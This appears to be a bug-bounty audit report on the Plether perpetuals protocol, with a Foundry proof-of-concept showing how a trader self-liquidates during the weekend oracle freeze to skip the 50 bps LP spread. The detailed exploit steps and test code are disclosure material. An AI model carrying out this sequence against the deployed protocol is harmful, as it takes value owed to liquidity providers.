# \#98372 [SC-Medium] LPs lose the 50 bps frozen-close spread because a trader can make their own account liquidatable during the freeze and exit at the stale mark

**Submitted on Nov 7th 2026 at 13:11:10 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98372
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
While the oracle is frozen (weekends and holidays) a trader may still close, but only at the last Friday mark and only after paying a fixed 50 bps spread to LPs plus the 4 bps execution fee. Liquidations settle at the same stale mark and, by design, pay neither. What is not documented is that the trader controls when their own account becomes liquidatable during the freeze. By withdrawing free cash at the right moment, or by letting weekend carry push a live pledge through the 300 bps frozen-market margin, a trader turns the liquidation path into a chosen exit. The trader keeps a free option on the closed FX market all weekend and, when the market has moved against them, exits at Friday's price for about 7.5 bps. The 50 bps spread that was meant to price that option goes unpaid and LPs absorb the gap. Four tests show the trader ending 662.61 USDG better off and the pool 605.61 USDG worse off than the designed exit on a 142.5k position, and the same effect with a third-party keeper.

## Vulnerability Details
During `oracleFrozen` windows (Friday 17:00 to Sunday 17:00 New York, plus holiday overrides) no fresh prices arrive. Plether documents how exits work in that state. A voluntary close still executes, but at the stored Friday mark and with a fixed 50 bps spread paid to LPs on top of the 4 bps execution fee; SECURITY.md calls that spread the stale-price protection for LPs. Liquidations use the same stored mark with a 2.5 bps adverse shift and, in the words of the accounting spec, "do not assess the spread", nor the execution fee or a fresh close VPI. Liquidation is permissionless and keepers are untrusted. All of that is intended, and this report does not ask for the liquidation pricing to change.

What the documentation does not say, and what the code does not prevent, is that during the freeze the trader decides when their own account becomes liquidatable. Liquidation is written up as something that happens to an unsafe account. A healthy, profitable trader can bring it about at a time of their choosing, and once they can do that, the liquidation path is simply a second way to take the stale-mark exit, at about 7.5 bps instead of 54.

The first way is to withdraw free cash and let carry go uncovered. Carry is collected from the position's PnL pledge first and from free cash second, so a profitable position held for a few weeks has had its pledge eaten by carry while free cash keeps paying. The withdraw guard only checks that carry is covered right now and that price health holds on pledge plus claim; free cash is not part of that equity, so a trader whose unrealised profit carries their margin can withdraw every USDG of free cash (`CfdEngineSettlementSidecar.sol`, `_requireWithdrawPositionHealthy`, L293-L303). One second later the next slice of carry has nothing to draw on and `planLiquidation` marks the account liquidatable regardless of price health:

```solidity
// CfdEnginePlanLib.sol L1465-L1469
if (!delta.riskState.liquidatable && delta.pendingCarryAssets == delta.realizedCarryAssets) {
    return delta;
}
delta.riskState.liquidatable = true;
```

The trader then calls `router.executeLiquidation` on their own account. No Pyth payload is needed while frozen, the Router passes `msg.sender` as the keeper without comparing it to the account (`OrderLiquidationBatchLogic.sol` L727-L729), and half of the 10 bps liquidation charge comes straight back to the trader as the keeper share (`MarginClearinghouse.sol` L1264-L1270). The position settles at the Friday mark plus 2.5 bps, the profit is paid in full, and no spread, fee or close VPI is charged; `CloseAccountingLib.sol` L122-L124 applies the spread only inside `buildCloseState`, which liquidation never calls.

The second way needs neither self-keeping nor carry arrears. Inside the freeze the 300 bps FAD margin applies, and pending carry is projected out of the pledge before health is evaluated (`CfdEnginePlanLib.sol` L1441, L1452-L1464). A position that enters the freeze within one weekend's carry above the FAD margin, about 1 bp of notional at typical utilisation, becomes liquidatable at a time anyone can compute. `addMargin` has no freeze gate, so the trader tops up to push the crossing back, waits for the weekend's news, and then either tops up again or stops and lets any keeper liquidate at Friday's price. Opens are blocked during the freeze, but the position can be set up in the live FAD shoulder on Friday afternoon, and a trader who runs near the FAD minimum anyway holds this option without trying.

Either way the designed frozen exit costs about 54 bps and the chosen liquidation about 7.5 bps, or 12.5 with an outside keeper. The spread exists because the trader is exiting on Friday's price with Monday's information; the liquidation path now gives them exactly that without the spread.

I have checked this against the known-issue list and the documents it points to. They describe the no-spread liquidation policy, carry-based liquidatability and permissionless keepers. None of them says a trader can make their own account liquidatable at will during the freeze or that liquidation can be a cheaper exit than a close, and nothing in the Cecuro, SC Audit Studio or AI-scan reports covers trader-induced liquidation. The root cause here is the trader's control over liquidation eligibility, not the liquidation pricing policy.


## Impact Details
Numbers from the attached tests with release parameters (`vpiFactor` 0.01e18, maintenance 10 bps, initial 20 bps, FAD 300 bps, carry 5%/yr, liquidation charge 10 bps with 50% to the keeper, spread 50 bps, fee 4 bps, `adverseConfidenceMultiplierBps` 2500).

Same frozen Saturday state, 142,500 USDG LONG 5% in profit, deep pool so the trader's own VPI is neutral:

| Exit | Trader ends with | Pool cash |
|---|---|---|
| Designed frozen voluntary close | 8,787.52 USDG | baseline |
| Withdraw, then self-liquidate at the same mark | 9,450.13 USDG | 605.61 USDG less (42.5 bps of notional) |

Against a 50 bps weekend gap in the trader's disfavour, holding to Monday and the designed exit leave the trader within 2 bps of each other, which is the spread doing its job. The self-liquidation beats holding by 48.3 bps and leaves LPs 44.3 bps worse than holding and 42.5 bps worse than the designed exit. With a favourable gap the trader simply holds, so LPs carry the asymmetry on every weekend and holiday for every qualifying position. Per 1M USDG of notional that is roughly 4,250 USDG of LP cash per adverse weekend.

Carry-crossing variant, 1M USDG LONG in a 2.6M pool, liquidated by an outside keeper on Sunday evening: trader 46,329.30 instead of 44,099.40 USDG (+2,229.89), pool 2,329.89 USDG less (23.3 bps). A 200 USDG top-up on Saturday postpones the crossing past the reopen, so the decision is the trader's until the last minutes of the freeze.

Who loses: Senior and Junior LPs lose the spread and the gap PnL the spread was meant to cover; the treasury loses the execution fee. The trader's only costs are 7.5 to 12.5 bps and the price risk of the position itself, which they can hedge elsewhere.



## Proof of Concept

## Proof of Concept

Attach `PoC_FrozenExitSelfLiquidation.t.sol` (one file, two test contracts, four tests). Save it as `packages/perps/test/poc/PoC_FrozenExitSelfLiquidation.t.sol` in a checkout at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It extends the repository's own `BasePerpTest`; nothing under `src/` is modified; mocks replace only Pyth (MockPyth) and USDG (MockSettlementToken). Every open and voluntary close goes through the public V3 `router.commitOrder(OrderRequest)` and `router.executeOrder`; the attack uses `clearinghouse.withdraw`, `engine.addMargin` and `router.executeLiquidation`.

```bash
cd packages/perps
forge test --match-path 'test/poc/PoC_FrozenExitSelfLiquidation.t.sol' -vv
```

Expected: 4 passed, 0 failed.

- `test_1_SelfLiquidationBeatsTheDesignedFrozenExit`: `trader saving: 662.607187`, `pool shortfall: 605.607187`, bps x100 of notional `4649` / `4249`.
- `test_2_AdverseWeekendGap_LpsPayTheDifference`: hold `8761.624723`, designed close `8787.520853`, self-liquidation `9450.128040`; `LP loss of (c) against (a), bps x100: 4429`; `against (b): 4249`.
- `test_3_CarryCrossing_AnyKeeperLiquidatesAtTheStaleMark`: designed close `44099.403424`, third-party liquidation `46329.295656`; `trader saving: 2229.892232`, `pool shortfall: 2329.892232`.
- `test_4_TraderPostponesTheCrossingWithATinyTopUp`: after a 200 USDG top-up the keeper's liquidation attempt reverts at Sunday 20:55 UTC.

Test 1 shows the withdraw lever (the withdraw passes, the account is healthy in the same second and liquidatable one second later, the trader liquidates themself). Test 2 shows why the spread exists and who pays when it is skipped. Tests 3 and 4 show the carry-crossing lever with an outside keeper and the trader's control over the timing.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/*
 * A trader can decide to be liquidated during an oracle-frozen window and exit at the stale Friday
 * mark without the 50 bps frozen-close spread, the 4 bps execution fee and the close VPI.
 *
 * Save as packages/perps/test/poc/PoC_FrozenExitSelfLiquidation.t.sol and run:
 *   forge test --match-path 'test/poc/PoC_FrozenExitSelfLiquidation.t.sol' -vv
 *
 * Release parameters from DEPLOYMENT.md: maintenance 10 bps, initial 20 bps, FAD 300 bps, carry 5%/yr,
 * liquidation charge 10 bps with a 50% keeper share, frozen-close spread 50 bps, execution fee 4 bps,
 * adverseConfidenceMultiplierBps 2500, vpiFactor 0.01e18.
 *
 * Every open and voluntary close goes through router.commitOrder(OrderRequest) / router.executeOrder.
 * The attack only uses clearinghouse.withdraw, engine.addMargin and router.executeLiquidation.
 * Nothing under src/ is modified; cheatcodes only move time, blocks and the mock Pyth feed.
 *
 * Part 1 (FrozenExit_UncoveredCarryTest): the trader withdraws all free cash, carry becomes uncovered one
 *         second later, and the trader liquidates their own account at the stale mark.
 * Part 2 (FrozenExit_CarryCrossingTest): no self-keeping. Weekend carry pushes a live pledge through the
 *         300 bps FAD margin at a time the trader can postpone with addMargin; any keeper liquidates.
 */
abstract contract FrozenExitBase is BasePerpTest {

    struct Outcome {
        uint256 trader; // clearinghouse balance + wallet balance
        uint256 pool; // HousePool physical assets
    }

    address internal constant ALICE = address(0xA11CE);
    address internal constant BOB = address(0xB0B);
    address internal constant CAROL = address(0xCA201);
    address internal constant KEEPER = address(0xE0EC);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public virtual override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500; // release value (harness default is 2000)
        config.minOpenNotionalAssets = 1000e6; // release value
        _setRouterConfig(config);
    }

    // ------------------------------------------------------------------ time and oracle helpers
    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _step(uint256 secondsForward) internal {
        vm.warp(_now() + secondsForward);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _live(uint256 price) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, _now(), previous));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _refreshMark(uint256 price) internal {
        if (_now() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_live(price));
    }

    // ------------------------------------------------------------------ state helpers
    function _pledge(address account) internal view returns (uint256 margin) {
        (, margin,,,,,) = engine.positions(account);
    }

    function _size(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _outcome(address account) internal view returns (Outcome memory o) {
        o.trader = clearinghouse.balanceAssets(account) + settlementToken.balanceOf(account);
        o.pool = pool.totalAssets();
    }

    function _bps100(uint256 amount, uint256 notional) internal pure returns (uint256) {
        return (amount * 1_000_000) / notional; // basis points x 100
    }

    // ------------------------------------------------------------------ public V3 Router path
    function _routerCommit(address account, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        internal
        returns (uint64 id)
    {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(_now()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        id = router.commitOrder(request);
    }

    function _routerOpen(address account, CfdTypes.Side side, uint256 size, uint256 margin, uint256 price) internal {
        uint64 id = _routerCommit(account, side, size, margin, false);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, _mockPythUpdateData(price));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public Router open executes");
    }

    /// @dev Full voluntary close through the public path. livePrice == 0 means a frozen close (no payload, next
    ///      second); otherwise a live close executed against a fresh post-commit tick at livePrice.
    function _routerCloseAll(address account, CfdTypes.Side side, uint256 size, uint256 livePrice) internal {
        uint64 id = _routerCommit(account, side, size, 0, true);
        bytes[] memory data;
        if (livePrice == 0) {
            _step(1);
            data = new bytes[](0);
        } else {
            data = _mockPythUpdateData(livePrice);
        }
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "voluntary close executes");
        assertEq(_size(account), 0, "position closed");
    }

    function _log(string memory label, Outcome memory start, Outcome memory end_) internal {
        emit log(label);
        emit log_named_decimal_uint("  trader value", end_.trader, 6);
        if (end_.pool >= start.pool) {
            emit log_named_decimal_uint("  pool cash change (+ LP gain)", end_.pool - start.pool, 6);
        } else {
            emit log_named_decimal_uint("  pool cash change (- LP loss)", start.pool - end_.pool, 6);
        }
    }

}

/// @notice Part 1. Deep 5M pool with other traders so Alice's own VPI is neutral between the two exits.
///         Alice is LONG 1,500 lots, 5% in profit. Carry has eaten her PnL pledge; free cash still pays it.
contract FrozenExit_UncoveredCarryTest is FrozenExitBase {

    uint256 internal constant ENTRY_PRICE = 1e8; // 1.00
    uint256 internal constant FRIDAY_PRICE = 95_000_000; // 0.95: LONG profits when the basket falls
    uint256 internal constant ALICE_LOTS = 1500; // 142,500 USDG notional at 0.95
    uint256 internal constant ALICE_MARGIN = 520e6;

    uint256 internal constant FRI = 1_712_343_600; // Fri 2024-04-05 19:00 UTC (FAD 20:30, frozen 21:00 UTC)
    uint256 internal constant SAT = 1_712_404_800; // Sat 2024-04-06 12:00 UTC
    uint256 internal constant MON = 1_712_570_400; // Mon 2024-04-08 10:00 UTC (live, FAD over)

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 5_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        _refreshMark(ENTRY_PRICE);
    }

    function _seedBook() internal {
        _fundTrader(BOB, 2_000_000e6);
        _fundTrader(CAROL, 3_000_000e6);
        // Chunks respect the 40%-of-depth skew cap. Carol carries Alice's 1,500 lots so Alice's open re-balances.
        _routerOpen(CAROL, CfdTypes.Side.SHORT, 17_500e20, 400_000e6, ENTRY_PRICE);
        _routerOpen(BOB, CfdTypes.Side.LONG, 17_500e20, 200_000e6, ENTRY_PRICE);
        _routerOpen(CAROL, CfdTypes.Side.SHORT, 19_000e20, 400_000e6, ENTRY_PRICE);
        _routerOpen(BOB, CfdTypes.Side.LONG, 17_500e20, 200_000e6, ENTRY_PRICE);
    }

    /// @dev Alice opens, the price moves 5% in her favour, margin-first carry consumes the pledge while her free
    ///      cash keeps paying it, Friday's last live mark is installed and the chain enters the frozen Saturday.
    function _toFrozenSaturday() internal {
        _seedBook();
        _fundTrader(ALICE, ALICE_MARGIN + 2000e6);
        _routerOpen(ALICE, CfdTypes.Side.LONG, ALICE_LOTS * 1e20, ALICE_MARGIN, ENTRY_PRICE);
        _refreshMark(FRIDAY_PRICE);
        vm.warp(FRI);
        _refreshMark(FRIDAY_PRICE); // last live mark before the freeze
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, 0); // ordinary zero withdrawal: checkpoints carry
        vm.warp(SAT);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "Saturday is oracle-frozen");
        assertTrue(engine.isFadWindow(), "Saturday is inside the FAD window (300 bps)");
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, 0);
        assertEq(_pledge(ALICE), 0, "precondition: carry has consumed the PnL pledge");
        assertFalse(engineLens.previewLiquidation(ALICE, FRIDAY_PRICE).liquidatable, "healthy at the frozen mark");
    }

    /// @dev The lever. The withdraw guard checks carry coverage and price health at this instant only.
    function _withdrawThenSelfLiquidate() internal {
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, 0);
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(ALICE);
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, free); // passes: price health is carried by the 5% unrealised profit
        assertFalse(engineLens.previewLiquidation(ALICE, FRIDAY_PRICE).liquidatable, "same second: still healthy");
        _step(1);
        assertTrue(engineLens.previewLiquidation(ALICE, FRIDAY_PRICE).liquidatable, "one second later: uncovered carry");
        vm.prank(ALICE); // keeper == account: the Router passes msg.sender as keeper and never compares it
        router.executeLiquidation(ALICE, new bytes[](0)); // no Pyth payload needed while frozen
        assertEq(_size(ALICE), 0, "self-liquidated at the frozen mark");
    }

    /// @notice Same frozen Saturday state, two exits at the same stale mark: the designed voluntary frozen close
    ///         (4 bps fee + 50 bps LP spread) against the self-liquidation (10 bps charge, half returned as keeper).
    function test_1_SelfLiquidationBeatsTheDesignedFrozenExit() public {
        _toFrozenSaturday();
        uint256 notional = ALICE_LOTS * FRIDAY_PRICE;
        Outcome memory start = _outcome(ALICE);
        uint256 snap = vm.snapshotState();

        _routerCloseAll(ALICE, CfdTypes.Side.LONG, ALICE_LOTS * 1e20, 0);
        Outcome memory designed = _outcome(ALICE);
        vm.revertToState(snap);

        _withdrawThenSelfLiquidate();
        Outcome memory bypass = _outcome(ALICE);

        _log("designed frozen voluntary close", start, designed);
        _log("withdraw, then self-liquidate at the same stale mark", start, bypass);
        uint256 saving = bypass.trader - designed.trader;
        uint256 shortfall = designed.pool - bypass.pool;
        emit log_named_decimal_uint("trader saving", saving, 6);
        emit log_named_uint("trader saving, bps x100 of 142.5k notional", _bps100(saving, notional));
        emit log_named_decimal_uint("pool shortfall", shortfall, 6);
        emit log_named_uint("pool shortfall, bps x100", _bps100(shortfall, notional));
        assertGt(saving, (notional * 45) / 10_000, "trader saves more than 45 bps of notional");
        assertGt(shortfall, (notional * 40) / 10_000, "LPs receive more than 40 bps less");
    }

    /// @notice Why the spread exists. The real market gaps 50 bps against Alice over the weekend. Holding and the
    ///         designed frozen exit cost her about the same (the spread prices the option). The bypass beats both
    ///         and the difference is paid by the pool.
    function test_2_AdverseWeekendGap_LpsPayTheDifference() public {
        _toFrozenSaturday();
        uint256 gapPrice = (FRIDAY_PRICE * 10_050) / 10_000; // +50 bps, against the LONG
        uint256 notional = ALICE_LOTS * FRIDAY_PRICE;
        Outcome memory start = _outcome(ALICE);
        uint256 snap = vm.snapshotState();

        vm.warp(MON);
        _refreshMark(gapPrice);
        _routerCloseAll(ALICE, CfdTypes.Side.LONG, ALICE_LOTS * 1e20, gapPrice);
        Outcome memory hold = _outcome(ALICE);
        vm.revertToState(snap);

        _routerCloseAll(ALICE, CfdTypes.Side.LONG, ALICE_LOTS * 1e20, 0);
        Outcome memory designed = _outcome(ALICE);
        vm.revertToState(snap);

        _withdrawThenSelfLiquidate();
        Outcome memory bypass = _outcome(ALICE);

        _log("(a) hold, close live on Monday at the +50 bps gap", start, hold);
        _log("(b) designed frozen close on Saturday", start, designed);
        _log("(c) self-liquidation on Saturday", start, bypass);
        emit log_named_uint("trader gain of (c) over (a), bps x100", _bps100(bypass.trader - hold.trader, notional));
        emit log_named_uint("LP loss of (c) against (a), bps x100", _bps100(hold.pool - bypass.pool, notional));
        emit log_named_uint("LP loss of (c) against (b), bps x100", _bps100(designed.pool - bypass.pool, notional));
        uint256 abDiff = hold.trader > designed.trader ? hold.trader - designed.trader : designed.trader - hold.trader;
        assertLt(abDiff, (notional * 5) / 10_000, "designed exit is roughly break-even with holding");
        assertGt(bypass.trader, hold.trader, "bypass beats holding through the adverse gap");
        assertGt(hold.pool, bypass.pool + (notional * 35) / 10_000, "LPs lose more than 35 bps against holding");
        assertGt(designed.pool, bypass.pool + (notional * 40) / 10_000, "LPs lose more than 40 bps against the designed exit");
    }

}

/// @notice Part 2. No self-keeping and no uncovered carry. Alice is LONG 1M notional alone in a 2.6M pool and
///         enters the freeze a few bps above the 300 bps FAD margin. Weekend carry is taken from the pledge first,
///         so her equity crosses the FAD margin at a time she can postpone with addMargin. Any keeper liquidates.
contract FrozenExit_CarryCrossingTest is FrozenExitBase {

    uint256 internal constant PRICE = 1e8; // unchanged Friday to Sunday
    uint256 internal constant LOTS = 10_000;
    uint256 internal constant SIZE = LOTS * 1e20; // 1,000,000 USDG notional
    uint256 internal constant MARGIN = 30_000e6;
    uint256 internal constant FREE_CASH = 20_000e6;

    // May 2024 (EDT): FAD from 20:30 UTC Friday, oracle-frozen 21:00 UTC Friday to 20:59:59 UTC Sunday.
    uint256 internal constant FRIDAY_OPEN = 1_714_766_400; // Fri 2024-05-03 20:00 UTC (live)
    uint256 internal constant FRIDAY_LAST_LIVE = 1_714_769_940; // Fri 20:59 UTC (FAD, live)
    uint256 internal constant FRIDAY_FROZEN = 1_714_770_060; // Fri 21:01 UTC (frozen)
    uint256 internal constant SUNDAY_DECISION = 1_714_939_200; // Sun 2024-05-05 20:00 UTC (still frozen)

    // Frozen liquidation price: fixed 10 bps confidence, 25% of it applied adversely = +2.5 bps for a LONG.
    uint256 internal constant LIQ_PRICE = PRICE + (PRICE * 10 / 10_000) * 2500 / 10_000;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 2_600_000e6; // 1M LONG is 38.5% skew, inside the 40% cap
    }

    function _fadHeadroom() internal view returns (int256) {
        ICfdEngineTypes.LiquidationPreview memory p = engineLens.previewLiquidation(ALICE, LIQ_PRICE);
        return p.equityAssets - int256((LOTS * LIQ_PRICE * 300) / 10_000);
    }

    /// @dev Opens 1M LONG on Friday afternoon and tops the pledge up so the position enters the FAD window with
    ///      `headroom` USDG above the 300 bps requirement at the frozen liquidation price.
    function _arriveAtTheFreeze(uint256 headroom) internal {
        vm.warp(FRIDAY_OPEN);
        _refreshMark(PRICE);
        _fundTrader(ALICE, MARGIN + FREE_CASH);
        _routerOpen(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, PRICE);
        int256 shortfall = int256(headroom) - _fadHeadroom();
        if (shortfall > 0) {
            vm.prank(ALICE);
            engine.addMargin(ALICE, uint256(shortfall));
        }
        vm.warp(FRIDAY_LAST_LIVE);
        _refreshMark(PRICE); // last live mark before the freeze
        assertTrue(engine.isFadWindow() && !engine.isOracleFrozen(), "20:59 UTC: FAD window, still live");
        assertFalse(engineLens.previewLiquidation(ALICE, PRICE).liquidatable, "healthy under FAD at the live price");
        vm.warp(FRIDAY_FROZEN);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "21:01 UTC Friday is oracle-frozen");
        assertGt(_fadHeadroom(), 0, "not liquidatable at the freeze");
    }

    /// @notice Sunday evening the account is liquidatable from carry alone. A third-party keeper liquidates it at
    ///         the stale Friday mark. Compared with the designed frozen close, the trader is still better off and
    ///         the pool receives less.
    function test_3_CarryCrossing_AnyKeeperLiquidatesAtTheStaleMark() public {
        _arriveAtTheFreeze(80e6); // 80 USDG = 0.8 bps of notional above the FAD requirement
        vm.warp(SUNDAY_DECISION);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "Sunday 20:00 UTC: still frozen");
        assertGt(_pledge(ALICE), 25_000e6, "pledge is live, not exhausted");
        assertGt(clearinghouse.getFreeBuyingPowerAssets(ALICE), 0, "free cash still covers carry");
        assertEq(engine.unsettledCarryAssets(ALICE), 0, "eligibility comes from the FAD margin, not carry arrears");
        assertTrue(engineLens.previewLiquidation(ALICE, LIQ_PRICE).liquidatable, "weekend carry crossed the FAD margin");

        Outcome memory start = _outcome(ALICE);
        uint256 snap = vm.snapshotState();

        _routerCloseAll(ALICE, CfdTypes.Side.LONG, SIZE, 0);
        Outcome memory designed = _outcome(ALICE);
        vm.revertToState(snap);

        _step(1);
        vm.prank(KEEPER); // not the trader
        router.executeLiquidation(ALICE, new bytes[](0));
        assertEq(_size(ALICE), 0, "liquidated at the stale mark by a third party");
        Outcome memory bypass = _outcome(ALICE);

        _log("designed frozen voluntary close", start, designed);
        _log("third-party liquidation at the same stale mark", start, bypass);
        emit log_named_decimal_uint("trader saving", bypass.trader - designed.trader, 6);
        emit log_named_decimal_uint("pool shortfall", designed.pool - bypass.pool, 6);
        assertGt(bypass.trader, designed.trader + 1500e6, "trader more than 15 bps better off");
        assertGt(designed.pool, bypass.pool + 2000e6, "LPs more than 20 bps worse off");
    }

    /// @notice The exit decision is the trader's: a 200 USDG top-up on Saturday pushes the crossing past the reopen,
    ///         so the trader can wait for the weekend's news and then either top up or let the liquidation happen.
    function test_4_TraderPostponesTheCrossingWithATinyTopUp() public {
        _arriveAtTheFreeze(80e6);
        vm.warp(FRIDAY_FROZEN + 24 hours); // Saturday 21:01 UTC, before the projected crossing
        vm.roll(vm.getBlockNumber() + 1);
        assertGt(_fadHeadroom(), 0, "still above the FAD margin on Saturday");
        vm.prank(ALICE);
        engine.addMargin(ALICE, 200e6); // 2 bps of notional; addMargin has no freeze gate
        vm.warp(SUNDAY_DECISION + 55 minutes); // last minutes of the freeze
        vm.roll(vm.getBlockNumber() + 1);
        assertFalse(engineLens.previewLiquidation(ALICE, LIQ_PRICE).liquidatable, "postponed: still healthy");
        vm.prank(KEEPER);
        vm.expectRevert();
        router.executeLiquidation(ALICE, new bytes[](0));
    }

}
```
